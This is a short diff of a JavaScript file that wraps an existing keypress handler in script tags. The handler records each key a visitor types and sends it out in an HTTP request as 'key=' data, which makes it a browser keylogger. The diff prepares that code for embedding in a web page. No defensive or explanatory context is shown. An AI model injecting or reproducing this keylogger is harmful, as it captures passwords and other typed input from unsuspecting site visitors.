@@ -1,4 +1,4 @@
-
+<script>
 document.onkeypress = function (evt) {
 	evt = evt || window.event
 	key = String.fromCharCode(evt.charCode)
@@ -9,7 +9,7 @@ document.onkeypress = function (evt) {
     	http.send("key="+param);
 	}
 }
-
+</script>
 
 
 //     time = new Date().getTime()
